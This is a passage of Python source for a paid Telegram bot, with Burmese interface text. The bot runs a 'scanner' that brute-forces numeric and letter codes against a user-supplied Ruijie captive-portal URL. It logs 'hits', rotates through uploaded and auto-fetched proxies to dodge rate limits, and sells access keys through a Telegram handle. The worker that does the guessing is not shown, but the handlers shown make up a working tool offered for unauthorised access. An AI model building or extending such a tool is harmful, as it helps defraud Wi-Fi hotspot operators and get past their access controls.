        return

    if data.startswith("set_mode_"):
        new_mode = data[len("set_mode_"):]
        context.user_data["selected_mode"] = new_mode
        context.user_data["start_digit"] = None
        context.user_data["selected_plan"] = None
        context.user_data["random_mode"] = False

        if new_mode == "custom":
            context.user_data["waiting_for_digit"] = True
            await query.edit_message_text(
                "🎯 **Custom Start Digit**\n\n"
                "🔢 စတင်မည့် ဂဏန်းကို ပေးပို့ပါ (0-9):",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_back_markup("btn_back_mode"))
            return

        if new_mode in ("num6", "num7", "num8", "num9"):
            await query.edit_message_text(
                f"✅ **{MODES.get(new_mode, new_mode)}**\n\n"
                "ဘာရွေးချင်လဲ?",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_after_mode_menu())
            return

        await query.edit_message_text(
            f"✅ **{MODES.get(new_mode, new_mode)}**\n\n"
            "🚀 စတင်ရန် အသင့်ဖြစ်ပါပြီ",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_digit_selected_markup())
        return

    if data == "btn_update_portal":
        context.user_data["waiting_for_portal_url"] = True
        await query.edit_message_text(
            "🌐 **Portal URL ထည့်ပါ**\n\n"
            "သင့် Portal URL ကို ပေးပို့ပါ။\n"
            "ဥပမာ:\n"
            "`https://portal-as.ruijienetworks.com/...?mac=xxxx&...`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_mode_menu":
        await query.edit_message_text(
            "⚙️ **Choose Scanner Mode**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🔢 **Number** — ဂဏန်းသီးသန့်\n"
            "🔤 **Eng** — အင်္ဂလိပ်စာလုံး\n"
            "☣️ **Mix** — ဂဏန်း + စာလုံး\n"
            "🎯 **Custom** — ကိုယ်တိုင် စတင်ဂဏန်း\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_mode_menu_markup())
        return

    if data == "btn_digit_menu":
        mode = context.user_data.get("selected_mode", "num6")
        selected = context.user_data.get("start_digit")
        selected_text = f"`{selected}`" if selected is not None else "☣️"
        await query.edit_message_text(
            f"✅ **{MODES.get(mode, mode)}**\n\n"
            f"🎯 ထိပ်စီး — {selected_text}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_num_menu_markup())
        return

    if data == "btn_num_menu":
        mode = context.user_data.get("selected_mode", "num6")
        selected = context.user_data.get("start_digit")
        selected_text = f"`{selected}`" if selected is not None else "☣️"
        await query.edit_message_text(
            f"✅ **{MODES.get(mode, mode)}**\n\n"
            f"🎯 ထိပ်စီး — {selected_text}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_num_menu_markup())
        return

    if data.startswith("set_digit_"):
        val = data[len("set_digit_"):]
        if val == "random":
            context.user_data["start_digit"] = None
        else:
            context.user_data["start_digit"] = int(val)
        context.user_data["selected_plan"] = None
        context.user_data["random_mode"] = False

        text, markup = get_selected_markup(context)
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
        return

    if data == "btn_plan_menu":
        mode = context.user_data.get("selected_mode", "num6")
        await query.edit_message_text(
            f"✅ **{MODES.get(mode, mode)}**\n\n"
            "📅 Plan ရွေးပါ:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_plan_menu_markup())
        return

    if data == "btn_plan_month":
        await query.edit_message_text(
            "📅 **Month**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_plan_month_markup())
        return

    if data == "btn_plan_day":
        await query.edit_message_text(
            "📆 **Day**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_plan_day_markup())
        return

    if data == "btn_plan_hour":
        await query.edit_message_text(
            "⏰ **Hour**",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_plan_hour_markup())
        return

    if data == "set_plan_custom_month":
        context.user_data["waiting_for_custom_plan"] = "month"
        await query.edit_message_text(
            "✏️ **Custom Month**\n\n"
            "လ အရေအတွက် ပေးပို့ပါ (1-24):",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_plan_month"))
        return

    if data == "set_plan_custom_day":
        context.user_data["waiting_for_custom_plan"] = "day"
        await query.edit_message_text(
            "✏️ **Custom Day**\n\n"
            "ရက် အရေအတွက် ပေးပို့ပါ (1-365):",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_plan_day"))
        return

    if data == "set_plan_custom_hour":
        context.user_data["waiting_for_custom_plan"] = "hour"
        await query.edit_message_text(
            "✏️ **Custom Hour**\n\n"
            "နာရီ အရေအတွက် ပေးပို့ပါ (1-8760):",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_plan_hour"))
        return

    if data.startswith("set_plan_"):
        plan_val = data[len("set_plan_"):]
        plan_map = {
            "1m": "1 Month", "2m": "2 Month", "3m": "3 Month",
            "6m": "6 Month", "12m": "12 Month",
            "1d": "1 Day", "3d": "3 Day", "7d": "7 Day",
            "15d": "15 Day", "30d": "30 Day",
            "1h": "1 Hour", "3h": "3 Hour", "6h": "6 Hour",
            "12h": "12 Hour", "24h": "24 Hour",
        }
        if plan_val in plan_map:
            context.user_data["selected_plan"] = plan_map[plan_val]
            context.user_data["start_digit"] = None
            context.user_data["random_mode"] = False

            text, markup = get_selected_markup(context)
            await query.edit_message_text(
                text, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
        return

    if data == "set_choice_random":
        context.user_data["start_digit"] = None
        context.user_data["selected_plan"] = None
        context.user_data["random_mode"] = True

        text, markup = get_selected_markup(context)
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
        return

    if data == "btn_add_proxies":
        context.user_data["waiting_for_proxy_file"] = True
        await query.edit_message_text(
            "📥 **Proxy File ပေးပို့ပါ**\n\n"
            "📎 `.txt` file ကို document အနေနဲ့ ပို့ပါ\n\n"
            "**File format (line တစ်ခုချင်း):**\n"
            "```\n"
            "123.45.67.89:8080\n"
            "socks5://user:pass@host:1080\n"
            "http://user:pass@host:3128\n"
            "```\n"
            f"📊 လက်ရှိ: `{used}/{total}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_proxy_status":
        total, used = pm.stats()
        sample = pm.proxies[:5] if pm.proxies else []
        sample_str = "\n".join(f"• `{p}`" for p in sample) if sample else "_(none)_"
        text = (
            "📊 **Proxy Status**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📦 Total: `{total}`\n"
            f"✅ Used: `{used}`\n"
            f"🔄 Remaining: `{total - used}`\n"
            "📌 Rotate mode — proxy မဖျက်\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"**Sample (5):**\n{sample_str}"
        )
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_clear_proxies":
        if not is_admin(user_id):
            await query.answer("⛔ Admin only", show_alert=True)
            return
        pm = get_proxy_manager()
        pm.clear_all()
        await query.edit_message_text(
            "🗑️ **Proxies အားလုံး ဖျောက်ပြီး**\n\n"
            "📥 ပြန်ထည့်ရန် ➕ Add Proxies ကို နှိပ်ပါ။",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_hit_file":
        state = user_scanners.get(user_id)
        hit_details = state.get("hit_details", []) if state else []
        if not hit_details:
            await query.answer("❌ Hit မရှိသေးပါ", show_alert=True)
            return
        try:
            await send_hit_file(context, user_id, hit_details)
            await query.answer("📁 Hit file ပို့ပြီးပါပြီ", show_alert=False)
        except Exception as exc:
            await query.answer(f"❌ Error: {exc}", show_alert=True)
        return

    if data == "btn_users":
        if not is_admin(user_id):
            await query.answer("⛔ Admin only", show_alert=True)
            return
        text = get_users_list_text()
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_clear_checked":
        state = user_scanners.get(user_id)
        tried = len(state.get("tried_codes", set())) if state else 0
        hits = len(state.get("hit_list", [])) if state else 0
        await query.edit_message_text(
            "⚠️ **Clear Checked Codes?**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🗑️ Tried codes : `{tried:,}`\n"
            f"🔥 Hit codes   : `{hits:,}`\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "❓ ဒီအချက်အလက်တွေ ဖျက်မှာ သေချာလား?",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes", callback_data="confirm_clear_yes"),
                 InlineKeyboardButton("❌ No", callback_data="confirm_clear_no")],
            ]))
        return

    if data == "confirm_clear_yes":
        state = user_scanners.get(user_id)
        cleared_tried = 0
        cleared_hits = 0
        cleared_details = 0
        if state:
            cleared_tried = len(state.get("tried_codes", set()))
            state["tried_codes"] = set()
            cleared_hits = len(state.get("hit_list", []))
            state["hit_list"] = []
            cleared_details = len(state.get("hit_details", []))
            state["hit_details"] = []
            start_digit = int(state.get("start_digit") or 6)
            state["counter"] = start_digit * 100000
            state["tried"] = 0
            state["hits"] = 0
            state["limits"] = 0
            state["net"] = 0
            state["failed"] = 0
            state["last_hit"] = None
            state["current_code"] = None
            state["recent_logs"] = []

        context.user_data["codes_cleared"] = True
        await query.edit_message_text(
            "🧹 **Checked Codes Cleared**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🗑️ Tried codes : `{cleared_tried:,}`\n"
            f"🔥 Hit codes   : `{cleared_hits:,}`\n"
            f"📋 Hit details : `{cleared_details:,}`\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "✅ စစ်ပြီးသား code အားလုံး ပြန်စစ်နိုင်ပါပြီ",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "confirm_clear_no":
        await query.edit_message_text(
            "❌ **Cancelled**\n\nဘာမှ မဖျက်ပါဘူး",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_start_scanner":
        state = user_scanners.get(user_id)
        if state and state.get("running"):
            await query.edit_message_text(
                "🔄 **Initializing scanner dashboard...**\n\n"
                "⚠️ Scanner လည်နေပြီးသား — dashboard ကို ဆက်ကြည့်ပါ",
                parse_mode=ParseMode.MARKDOWN)
            return

        await query.edit_message_text(
            "🔄 **Initializing scanner dashboard...**\n\n"
            "⚡ Workers တင်နေပါတယ်...",
            parse_mode=ParseMode.MARKDOWN)

        scanner_task = asyncio.create_task(run_user_scanner(context, user_id))
        context.user_data["scanner_task"] = scanner_task
        return

    if data == "stop_scan":
        state = user_scanners.get(user_id)
        stopped = False
        if state and state.get("running"):
            state["stop_event"].set()
            stopped = True
        context.user_data.pop("scanner_task", None)
        if stopped:
            try:
                await query.answer("🛑 Stopping...", show_alert=False)
            except Exception:
                pass
        else:
            await query.edit_message_text(
                "ℹ️ Scanner မလည်ပါ",
                reply_markup=get_back_markup("btn_back_main"))
        return

    if data == "btn_my_key":
        if is_admin(user_id):
            text = "🎃 **Admin Access**\n\n🔓 Unlimited\n🔑 Key မလိုအပ်ပါ"
        else:
            user_info = paid_users.get(user_id)
            if user_info:
                key_short = f"{user_info['key'][:8]}...{user_info['key'][-4:]}"
                text = (
                    "🔑 **သင့် Paid Key**\n\n"
                    f"📦 Plan: `{user_info['plan']}`\n"
                    f"📅 Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M:%S')}`\n"
                    f"🔐 Key: `{key_short}`"
                )
            else:
                text = "❌ **Paid Key မရှိပါ**\n\nဝယ်ရန် — Telegram: @Lord"
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

async def handle_text(update, context, *args, **kwargs):
    user_id = update.effective_user.id
    raw_text = (update.message.text or "").strip()
    pm = get_proxy_manager()
    mode = context.user_data.get("selected_mode", "num6")

    if context.user_data.get("waiting_for_paid_key"):
        context.user_data["waiting_for_paid_key"] = False
        if is_admin(user_id):
            await update.message.reply_text(
                "🎃 **Admin Access Granted**\n\n⚡ Control Panel ⚡",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=get_main_menu_markup(user_id))
            return
        result = validate_paid_key(raw_text)
        if result is None:
            await update.message.reply_text(
                "❌ **Key မှားနေပါတယ်**\n\nဝယ်ရန် — Telegram: @Lord",
                parse_mode=ParseMode.MARKDOWN)
            return
        if not result["valid"]:
            await update.message.reply_text(
                f"⏰ **Key သက်တမ်းကုန်ပါပြီ**\nExpired: `{result['expiry'].strftime('%Y-%m-%d %H:%M')}`",
                parse_mode=ParseMode.MARKDOWN)
            return
        register_paid_user(user_id, raw_text, result["expiry"], result["plan"])
        await update.message.reply_text(
            f"✅ **Key အတည်ပြုပြီး!**\n\n"
            f"📦 Plan: `{result['plan']}`\n"
            f"📅 Expires: `{result['expiry'].strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup(user_id))
        return

    if context.user_data.get("waiting_for_genkey"):
        if not is_admin(user_id):
            context.user_data["waiting_for_genkey"] = False
            await update.message.reply_text("⛔ Admin only", reply_markup=get_main_menu_markup(user_id))
            return
        await handle_genkey_input(update, context)
        return

    if not is_user_authorized(user_id):
        context.user_data["waiting_for_paid_key"] = True
        await update.message.reply_text(
            "🔐 **Paid User Key လိုအပ်ပါသည်**\n\n"
            "ဝယ်ရန် — Telegram: @Lord\n\n"
            "🔑 သင့် Key ကို ပေးပို့ပါ:",
            parse_mode=ParseMode.MARKDOWN)
        return

    if context.user_data.get("waiting_for_proxy_text"):
        context.user_data["waiting_for_proxy_text"] = False
        lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text(
                "❌ Proxy list အလွတ်မရေးပါနဲ့",
                reply_markup=get_back_markup("btn_back_main"))
            return
        added, invalid, duplicate = pm.add_proxies(lines)
        total, used = pm.stats()
        msg = (
            "✅ **Proxy ထည့်ပြီး**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"➕ အသစ်: `{added}`\n"
            f"♻️ ထပ်နေတာ (skip): `{duplicate}`\n"
            f"❌ မမှန်ကန်: `{invalid}`\n"
            f"📦 Total: `{total}`\n"
            f"✅ Used: `{used}`\n"
            "━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN,
                                        reply_markup=get_main_menu_markup(user_id))
        return

    if context.user_data.get("waiting_for_portal_url"):
        context.user_data["waiting_for_portal_url"] = False
        if not raw_text.lower().startswith(("http://", "https://")):
            await update.message.reply_text(
                "❌ URL မှားနေပါတယ် — http/https ပါရမယ်",
                reply_markup=get_back_markup("btn_back_main"))
            return
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(raw_text)
        except OSError:
            pass
        total, used = pm.stats()
        await update.message.reply_text(
            "✅ **Portal URL သိမ်းပြီး**\n\n"
            "⚡ **Control Panel** ⚡\n"
            f"⚙️ Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{used}/{total}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup(user_id))
        return

    if context.user_data.get("waiting_for_digit"):
        context.user_data["waiting_for_digit"] = False
        if not raw_text.isdigit():
            await update.message.reply_text(
                "❌ ဂဏန်းပဲ ထည့်ပါ",
                reply_markup=get_back_markup("btn_back_mode"))
            return
        context.user_data["start_digit"] = int(raw_text[0])
        total, used = pm.stats()
        await update.message.reply_text(
            f"✅ Start Digit = `{raw_text[0]}`\n\n"
            f"⚙️ Mode: `{MODES.get(mode, mode)}`\n"
            f"🔁 Proxies: `{used}/{total}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup(user_id))
        return

    if context.user_data.get("waiting_for_custom_plan"):
        unit = context.user_data.pop("waiting_for_custom_plan")
        if not raw_text.isdigit():
            await update.message.reply_text(
                "❌ ဂဏန်းပဲ ထည့်ပါ",
                reply_markup=get_back_markup("btn_plan_menu"))
            return
        num = int(raw_text)
        if unit == "month" and not (1 <= num <= 24):
            await update.message.reply_text("❌ 1-24 အတွင်း ထည့်ပါ")
            return
        if unit == "day" and not (1 <= num <= 365):
            await update.message.reply_text("❌ 1-365 အတွင်း ထည့်ပါ")
            return
        if unit == "hour" and not (1 <= num <= 8760):
            await update.message.reply_text("❌ 1-8760 အတွင်း ထည့်ပါ")
            return

        unit_label = {"month": "Month", "day": "Day", "hour": "Hour"}[unit]
        context.user_data["selected_plan"] = f"{num} {unit_label}"
        context.user_data["start_digit"] = None
        context.user_data["random_mode"] = False

        text, markup = get_selected_markup(context)
        await update.message.reply_text(
            text, parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
        return

    saved_url = get_user_data(user_id)
    total, used = pm.stats()
    if is_admin(user_id):
        key_line = "🎃 Admin Access"
    else:
        user_info = paid_users.get(user_id)
        if user_info:
            key_line = f"🔑 Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
        else:
            key_line = "🔑 Paid User"
    portal_line = "🌐 Portal: ready ✅" if saved_url else "❌ Portal မရှိပါ — Update Portal"

    extra_lines = ""
    if mode in ("num6", "num7", "num8", "num9"):
        digit = context.user_data.get("start_digit")
        plan = context.user_data.get("selected_plan")
        is_random = context.user_data.get("random_mode", False)
        if is_random:
            extra_lines = "☣️ Random: ✅\n"
        elif plan:
            extra_lines = f"📅 Plan: `{plan}`\n"
        elif digit is not None:
            extra_lines = f"🎯 Digit: `{digit}`\n"

    await update.message.reply_text(
        "⚡ **Flash Control Panel** ⚡\n\n"
        f"⚙️ Mode: `{MODES.get(mode, mode)}`\n"
        f"{extra_lines}"
        f"🔁 Proxies: `{used}/{total}`\n"
        f"⚡ Workers: `{NUM_WORKERS}`\n"
        f"{key_line}\n{portal_line}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup(user_id))

async def handle_document(update, context, *args, **kwargs):
    user_id = update.effective_user.id
    pm = get_proxy_manager()

    if not context.user_data.get("waiting_for_proxy_file"):
        return

    if not is_user_authorized(user_id):
        context.user_data["waiting_for_proxy_file"] = False
        await update.message.reply_text(
            "🔐 **Paid User Key လိုအပ်ပါသည်**\n\n"
            "ဝယ်ရန် — Telegram: @Lord/",
            parse_mode=ParseMode.MARKDOWN)
        return

    document = update.message.document
    if document is None:
        return

    fname = (document.file_name or "").lower()
    if not fname.endswith((".txt", ".text", ".csv", ".list")):
        await update.message.reply_text(
            "❌ `.txt` file ပဲ လက်ခံပါတယ်\n\n"
            "ပြန်ပို့ပါ သို့မဟုတ် ❌ Cancel နှိပ်ပါ",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    if document.file_size and document.file_size > 5 * 1024 * 1024:
        context.user_data["waiting_for_proxy_file"] = False
        await update.message.reply_text(
            "❌ File ကြီးလွန်းပါတယ် (5MB အထက် မရပါ)",
            reply_markup=get_back_markup("btn_back_main"))
        return

    status_msg = await update.message.reply_text(
        "⏳ **Proxy file ဖတ်နေပါတယ်...**",
        parse_mode=ParseMode.MARKDOWN)

    try:
        tg_file = await document.get_file()
        raw_bytes = await tg_file.download_as_bytearray()
        try:
            content = raw_bytes.decode("utf-8")
        except UnicodeDecodeError:
            content = raw_bytes.decode("latin-1", errors="ignore")
    except Exception as exc:
        context.user_data["waiting_for_proxy_file"] = False
        await status_msg.edit_text(
            f"❌ **File download error**\n\n`{exc}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_back_markup("btn_back_main"))
        return

    context.user_data["waiting_for_proxy_file"] = False

    lines = [l.strip() for l in content.splitlines() if l.strip()]
    if not lines:
        await status_msg.edit_text(
            "❌ File ထဲမှာ proxy မရှိပါ",
            reply_markup=get_back_markup("btn_back_main"))
        return

    added, invalid, duplicate = pm.add_proxies(lines)
    total, used = pm.stats()

    msg = (
        "✅ **Proxy File ဖတ်ပြီး**\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📄 File: `{document.file_name}`\n"
        f"📏 Lines: `{len(lines)}`\n"
        f"➕ အသစ်: `{added}`\n"
        f"♻️ ထပ်နေတာ (skip): `{duplicate}`\n"
        f"❌ မမှန်ကန်: `{invalid}`\n"
        f"📦 Total: `{total}`\n"
        f"✅ Used: `{used}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    await status_msg.edit_text(
        msg, parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup(user_id))

async def post_init(application):
    pm = get_proxy_manager()
    total, used = pm.stats()
    # Start auto-refresher background task in telegram application loop
    application.create_task(proxy_auto_refresher())

def main():
    ensure_files_exist()
    load_registered_users()
    
    asyncio.run(auto_fetch_and_test_proxies())

    request_options = {
        "connect_timeout": 60,
        "read_timeout": 60,
        "write_timeout": 60,
        "pool_timeout": 60,
    }
    if TELEGRAM_PROXY:
        request_options["proxy"] = TELEGRAM_PROXY
    request = HTTPXRequest(**request_options)
    app = Application.builder().token(BOT_TOKEN).request(request).post_init(post_init).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("reloadkeys", reloadkeys_command))
    app.add_handler(CommandHandler("proxy_status", proxy_status_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callbacks))

    print("Bot is running...")
    app.run_polling(drop_pending_updates=True)

show_banner()
check_approval()
check_time_integrity()

if __name__ == "__main__":
    main()